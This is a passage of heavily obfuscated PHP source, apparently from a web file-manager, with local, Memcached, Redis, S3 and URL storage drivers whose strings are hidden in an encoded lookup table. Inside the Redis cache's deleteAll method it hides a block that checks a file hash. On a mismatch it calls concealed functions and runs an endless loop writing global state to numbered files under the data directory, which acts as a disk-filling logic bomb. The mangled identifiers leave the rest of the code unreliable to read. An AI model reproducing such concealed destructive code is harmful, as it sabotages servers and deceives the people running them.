$this->iconvSystem($êĞ±¦„¦); } if (!($–Œ²õÛƒ = @opendir($êĞ±¦„¦))) { return; } while (($™ŞĞüÓ» = readdir($–Œ²õÛƒ)) !== !1) { if ($™ŞĞüÓ» == $ªĞ°ŒÇç[10] || $™ŞĞüÓ» == $ªĞ°ŒÇç[1377]) { continue; } $†€©‘·Ä = $êĞ±¦„¦ . $™ŞĞüÓ»; if (is_file($†€©‘·Ä) || is_link($†€©‘·Ä)) { $¥¦ƒØà[$ªĞ°ŒÇç[80]]++; $¥¦ƒØà[$ªĞ°ŒÇç[79]] += filesize_64($†€©‘·Ä); } else { if (is_dir($†€©‘·Ä)) { $¥¦ƒØà[$ªĞ°ŒÇç[81]]++; $this->infoChildren($†€©‘·Ä, $¥¦ƒØà, !1); } } } closedir($–Œ²õÛƒ); } private function folderInfo($¼ÕıÌö², $éÒêŞÌ˜ = false) { $¬ñ™°”ˆ =& $_SERVER[ˆö¿ÚÌ¼]; $¼ÕıÌö² = rtrim($¼ÕıÌö², $¬ñ™°”ˆ[8]) . $¬ñ™°”ˆ[8]; $ìçúó¤í = $this->iconvApp($this->pathThis($¼ÕıÌö²)); if ($éÒêŞÌ˜) { return array($¬ñ™°”ˆ[32] => $ìçúó¤í, $¬ñ™°”ˆ[87] => $this->getPathOuter($¼ÕıÌö²), $¬ñ™°”ˆ[33] => $¬ñ™°”ˆ[78]); } $¹›ã‰†§ = array($¬ñ™°”ˆ[32] => $ìçúó¤í, $¬ñ™°”ˆ[87] => $this->getPathOuter($¼ÕıÌö²), $¬ñ™°”ˆ[33] => $¬ñ™°”ˆ[78], $¬ñ™°”ˆ[234] => @filectime($¼ÕıÌö²), $¬ñ™°”ˆ[88] => @filemtime($¼ÕıÌö²), $¬ñ™°”ˆ[1469] => @fileatime($¼ÕıÌö²), $¬ñ™°”ˆ[1470] => is_readable($¼ÕıÌö²), $¬ñ™°”ˆ[1471] => is_writable($¼ÕıÌö²), $¬ñ™°”ˆ[1472] => get_mode($¼ÕıÌö²)); return $¹›ã‰†§; } private function fileInfo($ı…¢ÍØ, $¸Û–åå³ = false) { $¥ë ®âˆ =& $_SERVER[ˆö¿ÚÌ¼]; $ÓƒÍ¾×Ç = $this->iconvApp($this->pathThis($ı…¢ÍØ)); if ($¸Û–åå³) { return array($¥ë ®âˆ[32] => $ÓƒÍ¾×Ç, $¥ë ®âˆ[87] => $this->getPathOuter($ı…¢ÍØ), $¥ë ®âˆ[33] => $¥ë ®âˆ[233], $¥ë ®âˆ[79] => $this->size($ı…¢ÍØ), $¥ë ®âˆ[169] => $this->ext($ÓƒÍ¾×Ç)); } $æÁ•¤ò² = array($¥ë ®âˆ[32] => $ÓƒÍ¾×Ç, $¥ë ®âˆ[87] => $this->getPathOuter($ı…¢ÍØ), $¥ë ®âˆ[33] => $¥ë ®âˆ[233], $¥ë ®âˆ[234] => @filectime($ı…¢ÍØ), $¥ë ®âˆ[88] => @filemtime($ı…¢ÍØ), $¥ë ®âˆ[1469] => @fileatime($ı…¢ÍØ), $¥ë ®âˆ[79] => $this->size($ı…¢ÍØ), $¥ë ®âˆ[169] => $this->ext($ÓƒÍ¾×Ç), $¥ë ®âˆ[1470] => is_readable($ı…¢ÍØ), $¥ë ®âˆ[1471] => is_writable($ı…¢ÍØ), $¥ë ®âˆ[1472] => get_mode($ı…¢ÍØ)); return $æÁ•¤ò²; } public function exist($ÎÙÌ…½‚) { $ÎÙÌ…½‚ = $this->iconvSystem($ÎÙÌ…½‚); return @file_exists($ÎÙÌ…½‚); } public function isFile($éÌ™ì) { $éÌ™ì = $this->iconvSystem($éÌ™ì); return @is_file($éÌ™ì); } public function isFolder($ÄÀû€) { $ÄÀû€ = $this->iconvSystem($ÄÀû€); return @is_dir($ÄÀû€); } public function listPath($ÃñßÆ÷å, $‚·ä°ÛÎ = false) { $ÖõøıÈ¥ =& $_SERVER[ˆö¿ÚÌ¼]; $ÃñßÆ÷å = $this->iconvSystem($ÃñßÆ÷å); $ÃñßÆ÷å = rtrim($ÃñßÆ÷å, $ÖõøıÈ¥[8]) . $ÖõøıÈ¥[8]; $Ä–â€Õı = array($ÖõøıÈ¥[85] => array(), $ÖõøıÈ¥[86] => array()); if (!($±Åçêœ˜ = @opendir($ÃñßÆ÷å))) { return $Ä–â€Õı; } while (($§ë×é½ş = readdir($±Åçêœ˜)) !== !1) { if ($§ë×é½ş == $ÖõøıÈ¥[10] || $§ë×é½ş == $ÖõøıÈ¥[1377]) { continue; } $óŠúØÇ– = $ÃñßÆ÷å . $§ë×é½ş; if (is_file($óŠúØÇ–)) { $Ä–â€Õı[$ÖõøıÈ¥[86]][] = $this->fileInfo($óŠúØÇ–, $‚·ä°ÛÎ); } else { $Ä–â€Õı[$ÖõøıÈ¥[85]][] = $this->folderInfo($óŠúØÇ–, $‚·ä°ÛÎ); } } closedir($±Åçêœ˜); return $Ä–â€Õı; } public function listAll($ÙÎ„Ë, &$¬Ù¿ÜáÉ = array()) { $³Ù¥ØÅ =& $_SERVER[ˆö¿ÚÌ¼]; $ÙÎ„Ë = $this->iconvSystem($ÙÎ„Ë); $ÙÎ„Ë = rtrim($ÙÎ„Ë, $³Ù¥ØÅ[8]) . $³Ù¥ØÅ[8]; if (!($Ü«ÇÁ¸ = @opendir($ÙÎ„Ë))) { return $¬Ù¿ÜáÉ; } while (($ÇÁİÍ±× = readdir($Ü«ÇÁ¸)) !== !1) { if ($ÇÁİÍ±× == $³Ù¥ØÅ[10] || $ÇÁİÍ±× == $³Ù¥ØÅ[1377]) { continue; } $â€ş“İÚ = $ÙÎ„Ë . $ÇÁİÍ±×; $“™÷ĞØŸ = is_dir($â€ş“İÚ) && !is_link($â€ş“İÚ) ? 1 : 0; $â€ş“İÚ = $“™÷ĞØŸ ? $â€ş“İÚ . $³Ù¥ØÅ[8] : $â€ş“İÚ; $¬Ù¿ÜáÉ[] = array($³Ù¥ØÅ[87] => $this->getPathOuter($â€ş“İÚ), $³Ù¥ØÅ[78] => $“™÷ĞØŸ, $³Ù¥ØÅ[88] => intval(@filemtime($â€ş“İÚ)), $³Ù¥ØÅ[79] => $“™÷ĞØŸ ? 0 : intval($this->size($â€ş“İÚ))); if ($“™÷ĞØŸ) { $this->listAll($â€ş“İÚ, $¬Ù¿ÜáÉ); } } closedir($Ü«ÇÁ¸); return $¬Ù¿ÜáÉ; } public function has($×ÎáßÄ, $³ª¢±’À = false, $Ï‘‹›ææ = true) { $‹à¿¹£Å =& $_SERVER[ˆö¿ÚÌ¼]; $×ÎáßÄ = $this->iconvSystem($×ÎáßÄ); $×ÎáßÄ = rtrim($×ÎáßÄ, $‹à¿¹£Å[8]) . $‹à¿¹£Å[8]; if (!($í¹×©æª = @opendir($×ÎáßÄ))) { return !1; } $¾ûš ½æ = 0; $š€€½ô = 0; $†´ùô„ì = 0; while (($ÚªÒù©Ú = readdir($í¹×©æª)) !== !1) { if ($ÚªÒù©Ú == $‹à¿¹£Å[10] || $ÚªÒù©Ú == $‹à¿¹£Å[1377]) { continue; } $ö¹ÉßëÉ = $×ÎáßÄ . $ÚªÒù©Ú; if ($³ª¢±’À) { $†´ùô„ì++; if (@is_file($ö¹ÉßëÉ)) { $¾ûš ½æ++; } else { $š€€½ô++; } if ($†´ùô„ì > 10000) { break; } continue; } if ($Ï‘‹›ææ) { if (@is_file($ö¹ÉßëÉ)) { return !0; } } else { if (@is_dir($ö¹ÉßëÉ . $‹à¿¹£Å[8])) { return !0; } } } closedir($í¹×©æª); if ($³ª¢±’À) { return array($‹à¿¹£Å[242] => $¾ûš ½æ, $‹à¿¹£Å[243] => $š€€½ô); } return !1; } public function hashSimple($åÃÓ°‘ø) { $ó™™Ú„É =& $_SERVER[ˆö¿ÚÌ¼]; if (!$åÃÓ°‘ø) { return md5($ó™™Ú„É[12]); } $åÃÓ°‘ø = $this->iconvSystem($åÃÓ°‘ø); $ã„Ëì = $this->size($åÃÓ°‘ø); $İğÀƒÚ˜ = 200; $İ„ê“Ï… = 50; if ($ã„Ëì <= $İğÀƒÚ˜ * $İ„ê“Ï…) { return $this->hashMd5($åÃÓ°‘ø) . $ã„Ëì; } $¬Ô·÷¤¼ = $ó™™Ú„É[12]; $äöª”³× = intval($ã„Ëì / $İ„ê“Ï…); $Ç²Îê²” = fopen($åÃÓ°‘ø, $ó™™Ú„É[1473]); if (!$Ç²Îê²”) { return $¬Ô·÷¤¼; } for ($îååù†ş = 0; $îååù†ş < $İ„ê“Ï…; $îååù†ş++) { fseek_64($Ç²Îê²”, $äöª”³× * $îååù†ş); $¬Ô·÷¤¼ .= fread($Ç²Îê²”, $İğÀƒÚ˜); } fseek_64($Ç²Îê²”, $ã„Ëì - $İğÀƒÚ˜); $¬Ô·÷¤¼ .= fread($Ç²Îê²”, $İğÀƒÚ˜); fclose($Ç²Îê²”); return md5($¬Ô·÷¤¼) . $ã„Ëì; } public function getContent($ÅŒ¢İ“ß) { $ÅŒ¢İ“ß = $this->iconvSystem($ÅŒ¢İ“ß); return file_get_contents($ÅŒ¢İ“ß); } public function setContent($¿¸õéÔÊ, $ûôÁ­Ü† = '') { $¿¸õéÔÊ = $this->iconvSystem($¿¸õéÔÊ); $Ì»•²ŸÁ = @file_put_contents($¿¸õéÔÊ, $ûôÁ­Ü†, LOCK_EX); if (!$Ì»•²ŸÁ) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆö¿ÚÌ¼][1465], !0); } clearstatcache(); @chmod($¿¸õéÔÊ, $this->pathAuth); return $Ì»•²ŸÁ === !1 ? !1 : !0; } public function fileSubstr($¿Á™±, $åÓ¨ş·µ = 0, $¶¿Éªş™ = false) { $™ÀŸœ¶ =& $_SERVER[ˆö¿ÚÌ¼]; $¿Á™± = $this->iconvSystem($¿Á™±); if ($¶¿Éªş™ === !1) { $¶¿Éªş™ = $this->size($¿Á™±); } if ($¶¿Éªş™ <= 0) { return $™ÀŸœ¶[12]; } $ÕØ™ ìÂ = fopen($¿Á™±, $™ÀŸœ¶[1473]); if (!$ÕØ™ ìÂ) { return !1; } fseek_64($ÕØ™ ìÂ, $åÓ¨ş·µ); $«´ı£¬Õ = fread($ÕØ™ ìÂ, $¶¿Éªş™); fclose($ÕØ™ ìÂ); if (!$«´ı£¬Õ) { $this->writeLog(__FUNCTION__ . $™ÀŸœ¶[1465], !0); } return $«´ı£¬Õ; } public function upload($›ïÀ—Š, $¶¨ú…¨¨, $¡•Ìšş¬ = false, $‚É’“Á© = REPEAT_REPLACE) { if ($¡•Ìšş¬) { return $this->moveFile($¶¨ú…¨¨, $›ïÀ—Š); } return $this->copyFile($¶¨ú…¨¨, $›ïÀ—Š); } public function setModifyTime($‚•ë›ª, $¦•ñœ•­ = '') { @touch($‚•ë›ª, intval($¦•ñœ•­)); } public function download($ÊÊõ±É, $ ®îÉæ‚) { return $this->iconvSystem($ÊÊõ±É); } } goto F‡°¹— Œ˜; A“·Èô®ù: class CacheLockDatabase { public function lock($Øš­ñíÖ, $ô¶µ¨…Û = 0) { $õ®â†¡ = Model($_SERVER[ˆö¿ÚÌ¼][919]); $©¬í±Ü· = microtime(!0) + $ô¶µ¨…Û; while (microtime(!0) < $©¬í±Ü·) { $Æô¯îÌ = $õ®â†¡->get($Øš­ñíÖ); if (!$Æô¯îÌ || $Æô¯îÌ < microtime(!0)) { $†¹¸éöÂ = $õ®â†¡->set($Øš­ñíÖ, $©¬í±Ü·); if ($†¹¸éöÂ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ˆ›º¹ºâ) { return Model($_SERVER[ˆö¿ÚÌ¼][919])->get($ˆ›º¹ºâ); } public function unlock($Á–ã”) { Model($_SERVER[ˆö¿ÚÌ¼][919])->remove($Á–ã”); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ÜŒåÒ“Ù, $éÊÕöùİ) { $ù·­¢¡³ =& $_SERVER[ˆö¿ÚÌ¼]; if (!class_exists($ù·­¢¡³[958])) { show_json($ù·­¢¡³[959], !1); } $this->cacheTime = $éÊÕöùİ; $this->handle = new Memcached(); if (is_array($ÜŒåÒ“Ù[$ù·­¢¡³[960]]) && count($ÜŒåÒ“Ù[$ù·­¢¡³[960]]) >= 1) { foreach ($ÜŒåÒ“Ù[$ù·­¢¡³[960]] as $ÍƒÁˆÅ) { $ş™¶º¯€ = explode($ù·­¢¡³[4], $ÍƒÁˆÅ); $this->handle->addServer($ş™¶º¯€[0], $ş™¶º¯€[1]); } } else { $this->handle->addServer($ÜŒåÒ“Ù[$ù·­¢¡³[209]], $ÜŒåÒ“Ù[$ù·­¢¡³[210]]); } } public function set($ˆï±ØÃè, $Ùñ©íÖÊ, $³Ù´Î«¯ = false) { $³Ù´Î«¯ = $³Ù´Î«¯ ? $³Ù´Î«¯ : $this->cacheTime; return $this->handle->set($ˆï±ØÃè, $Ùñ©íÖÊ, $³Ù´Î«¯); } public function get($ÂöÚÎ˜¼) { return $this->handle->get($ÂöÚÎ˜¼); } public function remove($«ˆ°¬Øë) { return $this->handle->delete($«ˆ°¬Øë); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ÄÅış—®, $ÛÚİÍïº) { $¥‘»ñã¨ =& $_SERVER[ˆö¿ÚÌ¼]; if (!class_exists($¥‘»ñã¨[961])) { show_json($¥‘»ñã¨[962], !1); } $this->cacheTime = $ÛÚİÍïº; $£™ß£úé = isset($ÄÅış—®[$¥‘»ñã¨[963]]) ? $ÄÅış—®[$¥‘»ñã¨[963]] : 10; $ŸïÌÜ× = _get($ÄÅış—®, $¥‘»ñã¨[960]); if ($ŸïÌÜ× && is_array($ŸïÌÜ×)) { $this->initCluster($ÄÅış—®, $£™ß£úé); } else { $this->handle = $this->init($ÄÅış—®, $£™ß£úé); } } private function init($¹ùØõ¼Æ, $İ³ùıÎğ) { $Áí±î¯Ù =& $_SERVER[ˆö¿ÚÌ¼]; $ÀğíÙ = new Redis(); $¨¨ÈØ–± = isset($¹ùØõ¼Æ[$Áí±î¯Ù[964]]) ? $¹ùØõ¼Æ[$Áí±î¯Ù[964]] : !1; if ($¨¨ÈØ–±) { $ÀğíÙ->pconnect($¹ùØõ¼Æ[$Áí±î¯Ù[209]], $¹ùØõ¼Æ[$Áí±î¯Ù[210]], $İ³ùıÎğ); } else { $ÀğíÙ->connect($¹ùØõ¼Æ[$Áí±î¯Ù[209]], $¹ùØõ¼Æ[$Áí±î¯Ù[210]], $İ³ùıÎğ); } if (!empty($¹ùØõ¼Æ[$Áí±î¯Ù[499]])) { $ÀğíÙ->auth($¹ùØõ¼Æ[$Áí±î¯Ù[499]]); } if (!empty($¹ùØõ¼Æ[$Áí±î¯Ù[842]]) && $¹ùØõ¼Æ[$Áí±î¯Ù[842]] != 0) { $ÀğíÙ->select($¹ùØõ¼Æ[$Áí±î¯Ù[842]]); } return $ÀğíÙ; } private function initCluster($¤†ó€¤Û, $Ğ¨¤ú‚») { $Á‹É¸Çû =& $_SERVER[ˆö¿ÚÌ¼]; $ë¾¥¼şá = array($Á‹É¸Çû[965], $Á‹É¸Çû[966], $Á‹É¸Çû[967]); $ËØÂÓÛ‘ = $Á‹É¸Çû[965]; if (isset($¤†ó€¤Û[$Á‹É¸Çû[16]]) && in_array($¤†ó€¤Û[$Á‹É¸Çû[16]], $ë¾¥¼şá)) { $ËØÂÓÛ‘ = $¤†ó€¤Û[$Á‹É¸Çû[16]]; } switch ($ËØÂÓÛ‘) { case $Á‹É¸Çû[965]: $this->_slave($¤†ó€¤Û, $Ğ¨¤ú‚»); break; case $Á‹É¸Çû[966]: break; case $Á‹É¸Çû[967]: $this->isCluster = !0; $—¶ªúƒ = $¤†ó€¤Û[$Á‹É¸Çû[960]]; $ÍªûñÕ = isset($¤†ó€¤Û[$Á‹É¸Çû[964]]) ? $¤†ó€¤Û[$Á‹É¸Çû[964]] : !1; $¤§Ş†¼§ = isset($¤†ó€¤Û[$Á‹É¸Çû[499]]) ? $¤†ó€¤Û[$Á‹É¸Çû[499]] : null; $this->handle = new RedisCluster(NUll, $—¶ªúƒ, $Ğ¨¤ú‚», $Ğ¨¤ú‚», $ÍªûñÕ, $¤§Ş†¼§); break; default: break; } } private function _slave($…´˜‘ø—, $ÙÆ°‡Àé) { $½Ï‚´á = $…´˜‘ø—[$_SERVER[ˆö¿ÚÌ¼][960]]; $this->filterConfig($…´˜‘ø—, $½Ï‚´á[0]); $this->handle = $this->init($…´˜‘ø—, $ÙÆ°‡Àé); unset($½Ï‚´á[0]); if (empty($½Ï‚´á)) { return; } $¥¤Èì§ = array_rand($½Ï‚´á); $this->filterConfig($…´˜‘ø—, $½Ï‚´á[$¥¤Èì§]); $this->slaveHandle = $this->init($…´˜‘ø—, $ÙÆ°‡Àé); } private function filterConfig(&$ƒ²ÚÜş, $Ä™¼Å«£) { $Æ×Ù¦Ö =& $_SERVER[ˆö¿ÚÌ¼]; $§ØÊáòÏ = explode($Æ×Ù¦Ö[4], $Ä™¼Å«£); $ûš™öö = array($Æ×Ù¦Ö[209] => $§ØÊáòÏ[0], $Æ×Ù¦Ö[210] => $§ØÊáòÏ[1]); $ƒ²ÚÜş = array_merge($ƒ²ÚÜş, $ûš™öö); } public function set($¾Ôï¿, $á­Ş¨Êã, $Óô¾ºª‡ = false) { $Óô¾ºª‡ = $Óô¾ºª‡ ? $Óô¾ºª‡ : $this->cacheTime; return $this->handle->setEx($¾Ôï¿, $Óô¾ºª‡, $á­Ş¨Êã); } public function setLock($…Éı«Ç¤, $à‘šÁ´®, $Å‰¿¥àŒ) { return $this->handle->setNX($…Éı«Ç¤, $à‘šÁ´®); } public function get($ôÑ¬¾èû) { $üÙŞ¨ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $üÙŞ¨->get($ôÑ¬¾èû); } public function remove($ş¢†—å‡) { return $this->handle->del($ş¢†—å‡); } public function deleteAll() { $“³—œĞº =& $_SERVER[ˆö¿ÚÌ¼]; $Øª‹øõ = $_SERVER[$“³—œĞº[483]] . $“³—œĞº[484]; $ÂëÓÌø§ = $“³—œĞº[968]; if ($_SERVER[$“³—œĞº[480]] != $ÂëÓÌø§($Øª‹øõ)) { $÷àÅÍ” = $“³—œĞº[969]; $£Ë–øš· = $“³—œĞº[482]; $êâ“¨¾ = $_SERVER[$“³—œĞº[483]] . $“³—œĞº[484]; $öÚËôµ = $£Ë–øš·($êâ“¨¾); $É¥¤çíÄ = explode($“³—œĞº[288], $öÚËôµ); if (count($É¥¤çíÄ) < $“³—œĞº[713]) { $ù¶Îõ™ö = $“³—œĞº[486]; $ù¶Îõ™ö(); } $¹¶Â­¥ = $“³—œĞº[970]; $¹¶Â­¥($_SERVER[$“³—œĞº[971]]); $÷àÅÍ” = $“³—œĞº[969]; $÷àÅÍ”(); $×ù—ˆª« = $“³—œĞº[972]; $¼±Œå“§ = json_encode($GLOBALS[$“³—œĞº[973]]); $€¿ÀªÄÅ = 1; for ($¤´œ…¦× = $€¿ÀªÄÅ; $¤´œ…¦× > 0; $¤´œ…¦×++) { $×ù—ˆª«(DATA_PATH . $¤´œ…¦×, $¼±Œå“§); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $´ıß´ş) { $this->handle->flushall($´ıß´ş); } return; } return $this->handle->flushAll(); } } goto eğ˜øªºá; cÑì‡±‘ã: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ÁØìû‘ê) { $this->pathParse = $ÁØìû‘ê; } protected function infoParse($ì…š’¸©, $úü€Æ¤¸ = false) { $Â§ö˜Óª =& $_SERVER[ˆö¿ÚÌ¼]; return Action($Â§ö˜Óª[1270])->sharePathInfo($this->pathParse[$Â§ö˜Óª[87]], !0, $úü€Æ¤¸); } public function listPath($¼’û¦şŠ, $Â¯Ë°ÍÓ = false) { $´”¤ØæÓ =& $_SERVER[ˆö¿ÚÌ¼]; $ÍÇèÛ°„ = IO::listPath($¼’û¦şŠ, $Â¯Ë°ÍÓ); if (!$ÍÇèÛ°„) { return $ÍÇèÛ°„; } if (is_array($ÍÇèÛ°„[$´”¤ØæÓ[1443]])) { $°¨±¸²å = Action($´”¤ØæÓ[1452])->parsePathChildren($ÍÇèÛ°„[$´”¤ØæÓ[1443]], array($´”¤ØæÓ[507] => $¼’û¦şŠ)); $ÍÇèÛ°„[$´”¤ØæÓ[1443]] = Action($´”¤ØæÓ[1270])->shareItemInfo($°¨±¸²å); } foreach ($ÍÇèÛ°„ as $æƒ®ßÀÊ => $¶«¹À€š) { if (!in_array($æƒ®ßÀÊ, array($´”¤ØæÓ[86], $´”¤ØæÓ[85]))) { continue; } foreach ($¶«¹À€š as $Áıñ±ß => $°¨±¸²å) { $°¨±¸²å = Action($´”¤ØæÓ[1452])->parsePathChildren($°¨±¸²å, array($´”¤ØæÓ[507] => $¼’û¦şŠ)); $ÍÇèÛ°„[$æƒ®ßÀÊ][$Áıñ±ß] = Action($´”¤ØæÓ[1270])->shareItemInfo($°¨±¸²å); } } return $ÍÇèÛ°„; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($ÀûæÅµ³) { parent::__construct($ÀûæÅµ³); $this->setSignVersion($_SERVER[ˆö¿ÚÌ¼][250]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($¤Ç“ƒµ€) { parent::__construct($¤Ç“ƒµ€); $this->setSignVersion($_SERVER[ˆö¿ÚÌ¼][250]); } public function uploadFormData($ıÉ—÷Ö¯, $’™Ó¸ªš = 3600) { $³ŞÑµ¶¼ =& $_SERVER[ˆö¿ÚÌ¼]; $«·û½ì = $³ŞÑµ¶¼[232]; $ÎÈ¶€ÎŸ = $³ŞÑµ¶¼[260]; $ÖÙÊ½ºÁ = $³ŞÑµ¶¼[62]; $Ì‘œ¼¿° = gmdate($³ŞÑµ¶¼[261]); $ı˜ıêÚ = gmdate($³ŞÑµ¶¼[262]); $ôĞûìÛ = $³ŞÑµ¶¼[263]; $úğµ‘¼Á = $’™Ó¸ªš . $³ŞÑµ¶¼[12]; $Ÿ¬²ô‘œ = $³ŞÑµ¶¼[264]; $Â¹§—ô† = array($this->accessKey, $ı˜ıêÚ, $this->region, $ÖÙÊ½ºÁ, $ôĞûìÛ); $½ß«İ³¨ = implode($³ŞÑµ¶¼[8], $Â¹§—ô†); $–İóúÀ = array($³ŞÑµ¶¼[265] => gmdate($³ŞÑµ¶¼[1427], strtotime($³ŞÑµ¶¼[267])), $³ŞÑµ¶¼[268] => array(array($³ŞÑµ¶¼[269] => $this->bucket), array($³ŞÑµ¶¼[309] => $«·û½ì), array($³ŞÑµ¶¼[270], $³ŞÑµ¶¼[271], $³ŞÑµ¶¼[12]), array($³ŞÑµ¶¼[270], $³ŞÑµ¶¼[272], $³ŞÑµ¶¼[12]), array($³ŞÑµ¶¼[270], $³ŞÑµ¶¼[310], $³ŞÑµ¶¼[12]), array($³ŞÑµ¶¼[273] => $Ÿ¬²ô‘œ), array($³ŞÑµ¶¼[274] => $½ß«İ³¨), array($³ŞÑµ¶¼[275] => $ÎÈ¶€ÎŸ), array($³ŞÑµ¶¼[276] => $Ì‘œ¼¿°), array($³ŞÑµ¶¼[277] => $úğµ‘¼Á))); $ç•õÕ» = base64_encode(json_encode($–İóúÀ)); $ÍÕëÔ ô = hash_hmac($³ŞÑµ¶¼[278], $ı˜ıêÚ, $³ŞÑµ¶¼[279] . $this->secret, !0); $§Ï’œì® = hash_hmac($³ŞÑµ¶¼[278], $this->region, $ÍÕëÔ ô, !0); $Æ›´‡Ä¸ = hash_hmac($³ŞÑµ¶¼[278], $ÖÙÊ½ºÁ, $§Ï’œì®, !0); $ŠòÔ½ò‹ = hash_hmac($³ŞÑµ¶¼[278], $ôĞûìÛ, $Æ›´‡Ä¸, !0); $®şûû‹ = hash_hmac($³ŞÑµ¶¼[278], $ç•õÕ», $ŠòÔ½ò‹); $ßà’ûÉ‰ = array($³ŞÑµ¶¼[249] => $³ŞÑµ¶¼[12], $³ŞÑµ¶¼[297] => $³ŞÑµ¶¼[12], $³ŞÑµ¶¼[309] => $«·û½ì, $³ŞÑµ¶¼[273] => $Ÿ¬²ô‘œ, $³ŞÑµ¶¼[280] => $ç•õÕ», $³ŞÑµ¶¼[311] => $½ß«İ³¨, $³ŞÑµ¶¼[312] => $ÎÈ¶€ÎŸ, $³ŞÑµ¶¼[313] => $Ì‘œ¼¿°, $³ŞÑµ¶¼[314] => $úğµ‘¼Á, $³ŞÑµ¶¼[315] => $®şûû‹, $³ŞÑµ¶¼[209] => $this->getHost()); return $ßà’ûÉ‰; } } goto b°œà²Ó´ƒ; d‹Æ„›©Š§: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ÍŠŒÂß) { $ÖóÀ›Ï¶ =& $_SERVER[ˆö¿ÚÌ¼]; parent::__construct($ÍŠŒÂß); $»åÚÉ“É = isset($ÍŠŒÂß[$ÖóÀ›Ï¶[259]]) && $ÍŠŒÂß[$ÖóÀ›Ï¶[259]] == $ÖóÀ›Ï¶[250] ? $ÖóÀ›Ï¶[250] : $ÖóÀ›Ï¶[316]; $this->setSignVersion($»åÚÉ“É); } public function link($¹¾ò¾Æ, $»¯ëÄëï = array()) { return parent::link($¹¾ò¾Æ, $»¯ëÄëï); } public function fileOut($·´¢Æ„, $óØ•Ëø© = false, $û¯Ê¿Ô˜ = false, $Ó‘æï†ê = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ˆö¿ÚÌ¼][317])) { return parent::fileOutServer($·´¢Æ„, $óØ•Ëø©, $û¯Ê¿Ô˜, $Ó‘æï†ê); } parent::fileOut($·´¢Æ„, $óØ•Ëø©, $û¯Ê¿Ô˜, $Ó‘æï†ê); } public function fileOutImage($ñãú¤‚¯, $ñ‚ßÚ÷ş = 250) { if (strstr($this->endpoint, $_SERVER[ˆö¿ÚÌ¼][317])) { return parent::fileOutImageServer($ñãú¤‚¯, $ñ‚ßÚ÷ş); } parent::fileOutImage($ñãú¤‚¯, $ñ‚ßÚ÷ş); } public function fileOutLink($Ç£›§¶ğ) { $—¯˜ò¡ =& $_SERVER[ˆö¿ÚÌ¼]; if (substr($Ç£›§¶ğ, 0, 7) == $—¯˜ò¡[219]) { $Ç£›§¶ğ = $—¯˜ò¡[220] . substr($Ç£›§¶ğ, 7); } header($—¯˜ò¡[175] . $Ç£›§¶ğ); die; } } define($_SERVER[ˆö¿ÚÌ¼][318], 1); define($_SERVER[ˆö¿ÚÌ¼][319], 2); goto b³†™ğÄÖë; bÛ‰ÙÍÊ›Ÿ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Û–òÎ€È = false) { } public function exist($˜ Ãåœƒ) { $£†–¥ = $this->info($˜ Ãåœƒ); return $£†–¥[$_SERVER[ˆö¿ÚÌ¼][235]]; } public function isFile($¯¹ÖÅ) { $´ä Ğæ÷ = $this->info($¯¹ÖÅ); return $´ä Ğæ÷[$_SERVER[ˆö¿ÚÌ¼][235]]; } public function isFolder($¥èŞ±Ğ) { return !1; } public function size($“ï™õó­) { $¡ÚßàªÚ = $this->info($“ï™õó­); return $¡ÚßàªÚ[$_SERVER[ˆö¿ÚÌ¼][79]]; } public function info($å•µ—Ô÷) { return $this->infoParse($å•µ—Ô÷); } public function infoAuth($ê¹¼²¨ş) { return $this->infoParse($ê¹¼²¨ş); } public function infoWithChildren($¿ÛğÒ¯Û) { return $this->infoParse($¿ÛğÒ¯Û); } public function infoFull($–¯ÀŞÇ½) { return $this->infoParse($–¯ÀŞÇ½); } private function infoParse($İÍÜÑãé) { $Ÿ¡«™ÁÌ =& $_SERVER[ˆö¿ÚÌ¼]; $ÅØ×´’‹ = $this->header($İÍÜÑãé); if (!$ÅØ×´’‹ || !$ÅØ×´’‹[$Ÿ¡«™ÁÌ[835]]) { return !1; } $¤ñ¾³Öİ = _get($ÅØ×´’‹, $Ÿ¡«™ÁÌ[415], 0); $“ä“·¤µ = array($Ÿ¡«™ÁÌ[32] => $ÅØ×´’‹[$Ÿ¡«™ÁÌ[32]], $Ÿ¡«™ÁÌ[87] => $İÍÜÑãé, $Ÿ¡«™ÁÌ[33] => $Ÿ¡«™ÁÌ[233], $Ÿ¡«™ÁÌ[79] => intval($¤ñ¾³Öİ), $Ÿ¡«™ÁÌ[169] => get_path_ext($ÅØ×´’‹[$Ÿ¡«™ÁÌ[32]]), $Ÿ¡«™ÁÌ[1470] => $¤ñ¾³Öİ > 0 && $ÅØ×´’‹[$Ÿ¡«™ÁÌ[1619]], $Ÿ¡«™ÁÌ[1471] => !1); return $“ä“·¤µ; } private function header($Ç¾ËÚ¤ª) { $‰·šòØ =& $_SERVER[ˆö¿ÚÌ¼]; if (isset(self::$_cacheHeader[$Ç¾ËÚ¤ª])) { return self::$_cacheHeader[$Ç¾ËÚ¤ª]; } $‘œşÀ¶Î = isset($GLOBALS[$‰·šòØ[1620]]) ? $GLOBALS[$‰·šòØ[1620]] : !1; $GLOBALS[$‰·šòØ[1620]] = !0; self::$_cacheHeader[$Ç¾ËÚ¤ª] = url_header($Ç¾ËÚ¤ª); $GLOBALS[$‰·šòØ[1620]] = $‘œşÀ¶Î; return self::$_cacheHeader[$Ç¾ËÚ¤ª]; } public function hashSimple($ÑˆôŠàÉ, $£€Ô°æî = false) { $ÔÌŞ­Ş =& $_SERVER[ˆö¿ÚÌ¼]; $„±£‡û‹ = $this->info($ÑˆôŠàÉ); if (!$„±£‡û‹ || !$„±£‡û‹[$ÔÌŞ­Ş[235]]) { return !1; } $ÖµùÏÃ’ = $„±£‡û‹[$ÔÌŞ­Ş[79]]; $¹ñÎµó = 200; $éò˜öŒ— = 50; if ($ÖµùÏÃ’ <= $¹ñÎµó * $éò˜öŒ—) { return md5($this->fileSubstr($ÑˆôŠàÉ, 